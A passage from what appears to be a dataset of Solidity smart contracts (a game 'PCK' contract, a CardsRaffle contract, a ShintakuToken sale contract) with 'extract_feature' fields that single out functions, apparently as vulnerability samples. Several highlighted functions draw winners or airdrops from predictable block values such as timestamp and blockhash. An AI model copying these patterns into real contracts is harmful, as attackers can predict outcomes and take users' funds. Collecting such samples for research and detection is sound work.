(1000000000000000000)).sub(_pearn)).add(plyrRnds_[_pID][_rID].mask);\n return(_gen.sub((_ppt.mul(round_[_rID].keys)) / (1000000000000000000)));\n }\n function withdrawEarnings(uint256 _pID)\n private\n returns(uint256)\n {\n updateGenVault(_pID, plyr_[_pID].lrnd);\n uint256 _earnings = (plyr_[_pID].win).add(plyr_[_pID].gen).add(plyr_[_pID].aff);\n if (_earnings > 0)\n {\n plyr_[_pID].win = 0;\n plyr_[_pID].gen = 0;\n plyr_[_pID].aff = 0;\n }\n return(_earnings);\n }\n function endTx(uint256 _pID, uint256 _team, uint256 _eth, uint256 _keys, PCKdatasets.EventReturns memory _eventData_)\n private\n {\n _eventData_.compressedData = _eventData_.compressedData + (now * 1000000000000000000) + (_team * 100000000000000000000000000000);\n _eventData_.compressedIDs = _eventData_.compressedIDs + _pID + (rID_ * 10000000000000000000000000000000000000000000000000000);\n emit PCKevents.onEndTx\n (\n _eventData_.compressedData,\n _eventData_.compressedIDs,\n plyr_[_pID].name,\n msg.sender,\n _eth,\n _keys,\n _eventData_.winnerAddr,\n _eventData_.winnerName,\n _eventData_.amountWon,\n _eventData_.newPot,\n _eventData_.PCPAmount,\n _eventData_.genAmount,\n _eventData_.potAmount,\n airDropPot_\n );\n }\n bool public activated_ = false;\n function activate() public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) != address(0), \"must link to other PCK first\");\n require(activated_ == false, \"PCK already activated\");\n activated_ = true;\n rID_ = 1;\n round_[1].strt = now + rndExtra_ - rndGap_;\n round_[1].end = now + rndInit_ + rndExtra_;\n }\n function setOtherPCK(address _otherPCK) public {\n require(\n msg.sender == admin,\n \"only team just can activate\"\n );\n require(address(otherPCK_) == address(0), \"silly dev, you already did that\");\n otherPCK_ = otherPCK(_otherPCK);\n }\n}\nlibrary PCKdatasets {\n struct EventReturns {\n uint256 compressedData;\n uint256 compressedIDs;\n address winnerAddr;\n bytes32 winnerName;\n uint256 amountWon;\n uint256 newPot;\n uint256 PCPAmount;\n uint256 genAmount;\n uint256 potAmount;\n }\n struct Player {\n address addr;\n bytes32 name;\n uint256 win;\n uint256 gen;\n uint256 aff;\n uint256 lrnd;\n uint256 laff;\n }\n struct PlayerRounds {\n uint256 eth;\n uint256 keys;\n uint256 mask;\n uint256 ico;\n }\n struct Round {\n uint256 plyr;\n uint256 team;\n uint256 end;\n bool ended;\n uint256 strt;\n uint256 keys;\n uint256 eth;\n uint256 pot;\n uint256 mask;\n uint256 ico;\n uint256 icoGen;\n uint256 icoAvg;\n }\n struct TeamFee {\n uint256 gen;\n uint256 p3d;\n }\n struct PotSplit {\n uint256 gen;\n uint256 p3d;\n }\n}\nlibrary PCKKeysCalcLong {\n using SafeMath for *;\n function keysRec(uint256 _curEth, uint256 _newEth)\n internal\n pure\n returns (uint256)\n {\n return(keys((_curEth).add(_newEth)).sub(keys(_curEth)));\n }\n function ethRec(uint256 _curKeys, uint256 _sellKeys)\n internal\n pure\n returns (uint256)\n {\n return((eth(_curKeys)).sub(eth(_curKeys.sub(_sellKeys))));\n }\n function keys(uint256 _eth)\n internal\n pure\n returns(uint256)\n {\n return ((((((_eth).mul(1000000000000000000)).mul(312500000000000000000000000)).add(5624988281256103515625000000000000000000000000000000000000000000)).sqrt()).sub(74999921875000000000000000000000)) / (156250000);\n }\n function eth(uint256 _keys)\n internal\n pure\n returns(uint256)\n {\n return ((78125000).mul(_keys.sq()).add(((149999843750000).mul(_keys.mul(1000000000000000000))) / (2))) / ((1000000000000000000).sq());\n }\n}\ninterface otherPCK {\n function potSwap() external payable;\n}\ninterface PCKExtSettingInterface {\n function getFastGap() external view returns(uint256);\n function getLongGap() external view returns(uint256);\n function getFastExtra() external view returns(uint256);\n function getLongExtra() external view returns(uint256);\n}\ninterface PlayCoinGodInterface {\n function deposit() external payable;\n}\ninterface ProForwarderInterface {\n function deposit() external payable returns(bool);\n function status() external view returns(address, address, bool);\n function startMigration(address _newCorpBank) external returns(bool);\n function cancelMigration() external returns(bool);\n function finishMigration() external returns(bool);\n function setup(address _firstCorpBank) external;\n}\ninterface PlayerBookInterface {\n function getPlayerID(address _addr) external returns (uint256);\n function getPlayerName(uint256 _pID) external view returns (bytes32);\n function getPlayerLAff(uint256 _pID) external view returns (uint256);\n function getPlayerAddr(uint256 _pID) external view returns (address);\n function getNameFee() external view returns (uint256);\n function registerNameXIDFromDapp(address _addr, bytes32 _name, uint256 _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXaddrFromDapp(address _addr, bytes32 _name, address _affCode, bool _all) external payable returns(bool, uint256);\n function registerNameXnameFromDapp(address _addr, bytes32 _name, bytes32 _affCode, bool _all) external payable returns(bool, uint256);\n}\nlibrary NameFilter {\n function nameFilter(string _input)\n internal\n pure\n returns(bytes32)\n {\n bytes memory _temp = bytes(_input);\n uint256 _length = _temp.length;\n require (_length <= 32 && _length > 0, \"string must be between 1 and 32 characters\");\n require(_temp[0] != 0x20 && _temp[_length-1] != 0x20, \"string cannot start or end with space\");\n if (_temp[0] == 0x30)\n {\n require(_temp[1] != 0x78, \"string cannot start with 0x\");\n require(_temp[1] != 0x58, \"string cannot start with 0X\");\n }\n bool _hasNonNumber;\n for (uint256 i = 0; i < _length; i++)\n {\n if (_temp[i] > 0x40 && _temp[i] < 0x5b)\n {\n _temp[i] = byte(uint(_temp[i]) + 32);\n if (_hasNonNumber == false)\n _hasNonNumber = true;\n } else {\n require\n (\n _temp[i] == 0x20 ||\n (_temp[i] > 0x60 && _temp[i] < 0x7b) ||\n (_temp[i] > 0x2f && _temp[i] < 0x3a),\n \"string contains invalid characters\"\n );\n if (_temp[i] == 0x20)\n require( _temp[i+1] != 0x20, \"string cannot contain consecutive spaces\");\n if (_hasNonNumber == false && (_temp[i] < 0x30 || _temp[i] > 0x39))\n _hasNonNumber = true;\n }\n }\n require(_hasNonNumber == true, \"string cannot be only numbers\");\n bytes32 _ret;\n assembly {\n _ret := mload(add(_temp, 32))\n }\n return (_ret);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n require(c / a == b, \"SafeMath mul failed\");\n return c;\n }\n function sub(uint256 a, uint256 b)\n internal\n pure\n returns (uint256)\n {\n require(b <= a, \"SafeMath sub failed\");\n return a - b;\n }\n function add(uint256 a, uint256 b)\n internal\n pure\n returns (uint256 c)\n {\n c = a + b;\n require(c >= a, \"SafeMath add failed\");\n return c;\n }\n function sqrt(uint256 x)\n internal\n pure\n returns (uint256 y)\n {\n uint256 z = ((add(x,1)) / 2);\n y = x;\n while (z < y)\n {\n y = z;\n z = ((add((x / z),z)) / 2);\n }\n }\n function sq(uint256 x)\n internal\n pure\n returns (uint256)\n {\n return (mul(x,x));\n }\n function pwr(uint256 x, uint256 y)\n internal\n pure\n returns (uint256)\n {\n if (x==0)\n return (0);\n else if (y==0)\n return (1);\n else\n {\n uint256 z = x;\n for (uint256 i=1; i < y; i++)\n z = mul(z,x);\n return (z);\n }\n }\n}",
  "extract_feature": [
    "function airdrop() private view returns(bool) {\nuint256 seed = uint256(keccak256(abi.encodePacked(\n(block.timestamp).add\n(block.difficulty).add\n((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add\n(block.gaslimit).add\n((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add\n(block.number)\n)));\nif((seed - ((seed / 1000) * 1000)) < airDropTracker_)\nreturn(true);\nelse\nreturn(false);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b6c"
  },
  "filename": "3100.sol",
  "content": "pragma solidity ^0.4.18;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract AccessAdmin is Ownable {\n mapping (address => bool) adminContracts;\n mapping (address => bool) actionContracts;\n function setAdminContract(address _addr, bool _useful) public onlyOwner {\n require(_addr != address(0));\n adminContracts[_addr] = _useful;\n }\n modifier onlyAdmin {\n require(adminContracts[msg.sender]);\n _;\n }\n function setActionContract(address _actionAddr, bool _useful) public onlyAdmin {\n actionContracts[_actionAddr] = _useful;\n }\n modifier onlyAccess() {\n require(actionContracts[msg.sender]);\n _;\n }\n}\ninterface CardsInterface {\n function balanceOf(address player) public constant returns(uint256);\n function updatePlayersCoinByOut(address player) external;\n function updatePlayersCoinByPurchase(address player, uint256 purchaseCost) public;\n function removeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n function upgradeUnitMultipliers(address player, uint256 upgradeClass, uint256 unitId, uint256 upgradeValue) external;\n}\ninterface RareInterface {\n function getRareItemsOwner(uint256 rareId) external view returns (address);\n function getRareItemsPrice(uint256 rareId) external view returns (uint256);\n function getRareInfo(uint256 _tokenId) external view returns (\n uint256 sellingPrice,\n address owner,\n uint256 nextPrice,\n uint256 rareClass,\n uint256 cardId,\n uint256 rareValue\n );\n function transferToken(address _from, address _to, uint256 _tokenId) external;\n function transferTokenByContract(uint256 _tokenId,address _to) external;\n function setRarePrice(uint256 _rareId, uint256 _price) external;\n function rareStartPrice() external view returns (uint256);\n}\ncontract CardsRaffle is AccessAdmin {\n using SafeMath for SafeMath;\n function CardsRaffle() public {\n setAdminContract(msg.sender,true);\n setActionContract(msg.sender,true);\n }\n CardsInterface public cards ;\n RareInterface public rare;\n function setCardsAddress(address _address) external onlyOwner {\n cards = CardsInterface(_address);\n }\n function setRareAddress(address _address) external onlyOwner {\n rare = RareInterface(_address);\n }\n function getRareAddress() public view returns (address) {\n return rare;\n }\n event UnitBought(address player, uint256 unitId, uint256 amount);\n event RaffleSuccessful(address winner);\n struct TicketPurchases {\n TicketPurchase[] ticketsBought;\n uint256 numPurchases;\n uint256 raffleRareId;\n }\n struct TicketPurchase {\n uint256 startId;\n uint256 endId;\n }\n mapping(address => TicketPurchases) private ticketsBoughtByPlayer;\n mapping(uint256 => address[]) private rafflePlayers;\n uint256 private constant RAFFLE_TICKET_BASE_PRICE = 10000;\n uint256 private raffleEndTime;\n uint256 private raffleRareId;\n uint256 private raffleTicketsBought;\n address private raffleWinner;\n bool private raffleWinningTicketSelected;\n uint256 private raffleTicketThatWon;\n function buyRaffleTicket(uint256 amount) external {\n require(raffleEndTime >= block.timestamp);\n require(amount > 0);\n uint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\n require(cards.balanceOf(msg.sender) >= ticketsCost);\n cards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\n TicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\n if (purchases.raffleRareId != raffleRareId) {\n purchases.numPurchases = 0;\n purchases.raffleRareId = raffleRareId;\n rafflePlayers[raffleRareId].push(msg.sender);\n }\n if (purchases.numPurchases == purchases.ticketsBought.length) {\n purchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n }\n purchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\n raffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\n UnitBought(msg.sender,raffleRareId,amount);\n }\n function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\n require(rareId>0);\n require(rare.getRareItemsOwner(rareId) == getRareAddress());\n require(block.timestamp < endTime);\n if (raffleRareId != 0) {\n require(raffleWinner != 0);\n }\n raffleWinningTicketSelected = false;\n raffleTicketThatWon = 0;\n raffleWinner = 0;\n raffleTicketsBought = 0;\n raffleEndTime = endTime;\n raffleRareId = rareId;\n }\n function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\n require(raffleEndTime < block.timestamp);\n require(raffleWinner == 0);\n require(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\n if (!raffleWinningTicketSelected) {\n drawRandomWinner();\n }\n if (checkWinner != 0) {\n TicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\n if (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\n TicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\n if (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\n assignRafflePrize(checkWinner);\n return;\n }\n }\n }\n for (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\n address player = rafflePlayers[raffleRareId][i];\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n uint256 endIndex = playersTickets.numPurchases - 1;\n if (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\n for (uint256 j = 0; j < playersTickets.numPurchases; j++) {\n TicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\n if (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\n assignRafflePrize(player);\n return;\n }\n }\n }\n }\n }\n function assignRafflePrize(address winner) internal {\n raffleWinner = winner;\n uint256 newPrice = (rare.rareStartPrice() * 25) / 20;\n rare.transferTokenByContract(raffleRareId,winner);\n rare.setRarePrice(raffleRareId,newPrice);\n cards.updatePlayersCoinByOut(winner);\n uint256 upgradeClass;\n uint256 unitId;\n uint256 upgradeValue;\n (,,,,upgradeClass, unitId, upgradeValue) = rare.getRareInfo(raffleRareId);\n cards.upgradeUnitMultipliers(winner, upgradeClass, unitId, upgradeValue);\n RaffleSuccessful(winner);\n }\n function drawRandomWinner() public onlyAdmin {\n require(raffleEndTime < block.timestamp);\n require(!raffleWinningTicketSelected);\n uint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\n raffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\n raffleWinningTicketSelected = true;\n }\n function getRafflePlayers(uint256 raffleId) external constant returns (address[]) {\n return (rafflePlayers[raffleId]);\n }\n function getPlayersTickets(address player) external constant returns (uint256[], uint256[]) {\n TicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\n if (playersTickets.raffleRareId == raffleRareId) {\n uint256[] memory startIds = new uint256[](playersTickets.numPurchases);\n uint256[] memory endIds = new uint256[](playersTickets.numPurchases);\n for (uint256 i = 0; i < playersTickets.numPurchases; i++) {\n startIds[i] = playersTickets.ticketsBought[i].startId;\n endIds[i] = playersTickets.ticketsBought[i].endId;\n }\n }\n return (startIds, endIds);\n }\n function getLatestRaffleInfo() external constant returns (uint256, uint256, uint256, address, uint256) {\n return (raffleEndTime, raffleRareId, raffleTicketsBought, raffleWinner, raffleTicketThatWon);\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}",
  "extract_feature": [
    "function buyRaffleTicket(uint256 amount) external {\nrequire(raffleEndTime >= block.timestamp);\nrequire(amount > 0);\nuint256 ticketsCost = SafeMath.mul(RAFFLE_TICKET_BASE_PRICE, amount);\nrequire(cards.balanceOf(msg.sender) >= ticketsCost);\ncards.updatePlayersCoinByPurchase(msg.sender, ticketsCost);\nTicketPurchases storage purchases = ticketsBoughtByPlayer[msg.sender];\nif (purchases.raffleRareId != raffleRareId) {\npurchases.numPurchases = 0;\npurchases.raffleRareId = raffleRareId;\nrafflePlayers[raffleRareId].push(msg.sender);\n}\nif (purchases.numPurchases == purchases.ticketsBought.length) {\npurchases.ticketsBought.length = SafeMath.add(purchases.ticketsBought.length,1);\n}\npurchases.ticketsBought[purchases.numPurchases++] = TicketPurchase(raffleTicketsBought, raffleTicketsBought + (amount - 1));\nraffleTicketsBought = SafeMath.add(raffleTicketsBought,amount);\nUnitBought(msg.sender,raffleRareId,amount);\n}",
    "function startRareRaffle(uint256 endTime, uint256 rareId) external onlyAdmin {\nrequire(rareId>0);\nrequire(rare.getRareItemsOwner(rareId) == getRareAddress());\nrequire(block.timestamp < endTime);\nif (raffleRareId != 0) {\nrequire(raffleWinner != 0);\n}\nraffleWinningTicketSelected = false;\nraffleTicketThatWon = 0;\nraffleWinner = 0;\nraffleTicketsBought = 0;\nraffleEndTime = endTime;\nraffleRareId = rareId;\n}",
    "function awardRafflePrize(address checkWinner, uint256 checkIndex) external {\nrequire(raffleEndTime < block.timestamp);\nrequire(raffleWinner == 0);\nrequire(rare.getRareItemsOwner(raffleRareId) == getRareAddress());\nif (!raffleWinningTicketSelected) {\ndrawRandomWinner();\n}\nif (checkWinner != 0) {\nTicketPurchases storage tickets = ticketsBoughtByPlayer[checkWinner];\nif (tickets.numPurchases > 0 && checkIndex < tickets.numPurchases && tickets.raffleRareId == raffleRareId) {\nTicketPurchase storage checkTicket = tickets.ticketsBought[checkIndex];\nif (raffleTicketThatWon >= checkTicket.startId && raffleTicketThatWon <= checkTicket.endId) {\nassignRafflePrize(checkWinner);\nreturn;\n}\n}\n}\nfor (uint256 i = 0; i < rafflePlayers[raffleRareId].length; i++) {\naddress player = rafflePlayers[raffleRareId][i];\nTicketPurchases storage playersTickets = ticketsBoughtByPlayer[player];\nuint256 endIndex = playersTickets.numPurchases - 1;\nif (raffleTicketThatWon >= playersTickets.ticketsBought[0].startId && raffleTicketThatWon <= playersTickets.ticketsBought[endIndex].endId) {\nfor (uint256 j = 0; j < playersTickets.numPurchases; j++) {\nTicketPurchase storage playerTicket = playersTickets.ticketsBought[j];\nif (raffleTicketThatWon >= playerTicket.startId && raffleTicketThatWon <= playerTicket.endId) {\nassignRafflePrize(player);\nreturn;\n}\n}\n}\n}\n}",
    "function drawRandomWinner() public onlyAdmin {\nrequire(raffleEndTime < block.timestamp);\nrequire(!raffleWinningTicketSelected);\nuint256 seed = SafeMath.add(raffleTicketsBought , block.timestamp);\nraffleTicketThatWon = addmod(uint256(block.blockhash(block.number-1)), seed, raffleTicketsBought);\nraffleWinningTicketSelected = true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6a750a970a4fdc0b6d"
  },
  "filename": "3105.sol",
  "content": "pragma solidity ^0.4.24;\ncontract ERC223Receiver {\n constructor() internal {}\n function tokenFallback(address _from, uint _value, bytes _data) public;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint256 _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint256 _subtractedValue\n )\n public\n returns (bool)\n {\n uint256 oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract ERC223Token is StandardToken {\n using SafeMath for uint;\n event Transfer(address indexed from, address indexed to, uint value, bytes data);\n modifier enoughBalance(uint _value) {\n require (_value <= balanceOf(msg.sender));\n _;\n }\n function transfer(address _to, uint _value, bytes _data) public returns (bool success) {\n require(_to != address(0));\n return isContract(_to) ?\n transferToContract(_to, _value, _data) :\n transferToAddress(_to, _value, _data)\n ;\n }\n function transfer(address _to, uint _value) public returns (bool success) {\n bytes memory empty;\n return transfer(_to, _value, empty);\n }\n function isContract(address _addr) private view returns (bool is_contract) {\n uint length;\n assembly {\n length := extcodesize(_addr)\n }\n return (length > 0);\n }\n function transferToAddress(address _to, uint _value, bytes _data) private enoughBalance(_value) returns (bool success) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balanceOf(_to).add(_value);\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n function transferToContract(address _to, uint _value, bytes _data) private enoughBalance(_value) returns (bool success) {\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balanceOf(_to).add(_value);\n ERC223Receiver receiver = ERC223Receiver(_to);\n receiver.tokenFallback(msg.sender, _value, _data);\n emit Transfer(msg.sender, _to, _value, _data);\n return true;\n }\n}\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\ncontract StandardBurnableToken is BurnableToken, StandardToken {\n function burnFrom(address _from, uint256 _value) public {\n require(_value <= allowed[_from][msg.sender]);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n _burn(_from, _value);\n }\n}\ncontract BaseToken is ERC223Token, StandardBurnableToken {\n}\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\ncontract ShintakuToken is BaseToken, Ownable {\n using SafeMath for uint;\n string public constant symbol = \"SHN\";\n string public constant name = \"Shintaku\";\n uint8 public constant demicals = 18;\n uint public constant TOKEN_UNIT = (10 ** uint(demicals));\n uint public PERIOD_BLOCKS;\n uint public OWNER_LOCK_BLOCKS;\n uint public USER_LOCK_BLOCKS;\n uint public constant TAIL_EMISSION = 400 * (10 ** 3) * TOKEN_UNIT;\n uint public constant INITIAL_EMISSION_FACTOR = 25;\n uint public constant MAX_RECEIVED_PER_PERIOD = 10000 ether;\n struct Period {\n uint started;\n uint totalReceived;\n uint ownerLockedBalance;\n uint minting;\n mapping (address => bytes32) sealedPurchaseOrders;\n mapping (address => uint) receivedBalances;\n mapping (address => uint) lockedBalances;\n mapping (address => address) aliases;\n }\n modifier validPeriod(uint _period) {\n require(_period <= currentPeriodIndex());\n _;\n }\n Period[] internal periods;\n address public ownerAlias;\n event NextPeriod(uint indexed _period, uint indexed _block);\n event SealedOrderPlaced(address indexed _from, uint indexed _period, uint _value);\n event SealedOrderRevealed(address indexed _from, uint indexed _period, address indexed _alias, uint _value);\n event OpenOrderPlaced(address indexed _from, uint indexed _period, address indexed _alias, uint _value);\n event Claimed(address indexed _from, uint indexed _period, address indexed _alias, uint _value);\n constructor(address _alias, uint _periodBlocks, uint _ownerLockFactor, uint _userLockFactor) public {\n require(_alias != address(0));\n require(_periodBlocks >= 2);\n require(_ownerLockFactor > 0);\n require(_userLockFactor > 0);\n periods.push(Period(block.number, 0, 0, calculateMinting(0)));\n ownerAlias = _alias;\n PERIOD_BLOCKS = _periodBlocks;\n OWNER_LOCK_BLOCKS = _periodBlocks.mul(_ownerLockFactor);\n USER_LOCK_BLOCKS = _periodBlocks.mul(_userLockFactor);\n }\n function nextPeriod() public {\n uint periodIndex = currentPeriodIndex();\n uint periodIndexNext = periodIndex.add(1);\n require(block.number.sub(periods[periodIndex].started) > PERIOD_BLOCKS);\n periods.push(Period(block.number, 0, 0, calculateMinting(periodIndexNext)));\n emit NextPeriod(periodIndexNext, block.number);\n }\n function createPurchaseOrder(address _from, uint _period, uint _value, bytes32 _salt) public pure returns (bytes32) {\n return keccak256(abi.encodePacked(_from, _period, _value, _salt));\n }\n function placePurchaseOrder(bytes32 _sealedPurchaseOrder) public payable {\n if (block.number.sub(periods[currentPeriodIndex()].started) > PERIOD_BLOCKS) {\n nextPeriod();\n }\n Period storage period = periods[currentPeriodIndex()];\n require(period.sealedPurchaseOrders[msg.sender] == bytes32(0));\n period.sealedPurchaseOrders[msg.sender] = _sealedPurchaseOrder;\n period.receivedBalances[msg.sender] = msg.value;\n emit SealedOrderPlaced(msg.sender, currentPeriodIndex(), msg.value);\n }\n function revealPurchaseOrder(bytes32 _sealedPurchaseOrder, uint _period, uint _value, bytes32 _salt, address _alias) public {\n require(_alias != address(0));\n require(currentPeriodIndex() == _period.add(1));\n Period storage period = periods[_period];\n require(period.aliases[msg.sender] == address(0));\n bytes32 h = createPurchaseOrder(msg.sender, _period, _value, _salt);\n require(h == _sealedPurchaseOrder);\n require(_value <= period.receivedBalances[msg.sender]);\n period.totalReceived = period.totalReceived.add(_value);\n uint remainder = period.receivedBalances[msg.sender].sub(_value);\n period.receivedBalances[msg.sender] = _value;\n period.aliases[msg.sender] = _alias;\n emit SealedOrderRevealed(msg.sender, _period, _alias, _value);\n _alias.transfer(remainder);\n }\n function placeOpenPurchaseOrder(address _alias) public payable {\n require(_alias != address(0));\n if (block.number.sub(periods[currentPeriodIndex()].started) > PERIOD_BLOCKS) {\n nextPeriod();\n }\n Period storage period = periods[currentPeriodIndex()];\n require(period.aliases[msg.sender] == address(0));\n period.totalReceived = period.totalReceived.add(msg.value);\n period.receivedBalances[msg.sender] = msg.value;\n period.aliases[msg.sender] = _alias;\n emit OpenOrderPlaced(msg.sender, currentPeriodIndex(), _alias, msg.value);\n }\n function claim(address _from, uint _period) public {\n require(currentPeriodIndex() > _period.add(1));\n Period storage period = periods[_period];\n require(period.receivedBalances[_from] > 0);\n uint value = period.receivedBalances[_from];\n delete period.receivedBalances[_from];\n (uint emission, uint spent) = calculateEmission(_period, value);\n uint remainder = value.sub(spent);\n address alias = period.aliases[_from];\n mint(alias, emission);\n period.lockedBalances[_from] = period.lockedBalances[_from].add(remainder);\n period.ownerLockedBalance = period.ownerLockedBalance.add(spent);\n emit Claimed(_from, _period, alias, emission);\n }\n function withdraw(address _from, uint _period) public {\n require(currentPeriodIndex() > _period);\n Period storage period = periods[_period];\n require(block.number.sub(period.started) > USER_LOCK_BLOCKS);\n uint balance = period.lockedBalances[_from];\n require(balance <= address(this).balance);\n delete period.lockedBalances[_from];\n address alias = period.aliases[_from];\n alias.transfer(balance);\n }\n function withdrawOwner(uint _period) public onlyOwner {\n require(currentPeriodIndex() > _period);\n Period storage period = periods[_period];\n require(block.number.sub(period.started) > OWNER_LOCK_BLOCKS);\n uint balance = period.ownerLockedBalance;\n require(balance <= address(this).balance);\n delete period.ownerLockedBalance;\n ownerAlias.transfer(balance);\n }\n function withdrawOwnerUnrevealed(uint _period, address _from) public onlyOwner {\n require(currentPeriodIndex() > _period.add(1));\n Period storage period = periods[_period];\n require(block.number.sub(period.started) > OWNER_LOCK_BLOCKS);\n uint balance = period.receivedBalances[_from];\n require(balance <= address(this).balance);\n delete period.receivedBalances[_from];\n ownerAlias.transfer(balance);\n }\n function calculateMinting(uint _period) internal pure returns (uint) {\n return\n _period < INITIAL_EMISSION_FACTOR ?\n TAIL_EMISSION.mul(INITIAL_EMISSION_FACTOR.sub(_period)) :\n TAIL_EMISSION\n ;\n }\n function currentPeriodIndex() public view returns (uint) {\n 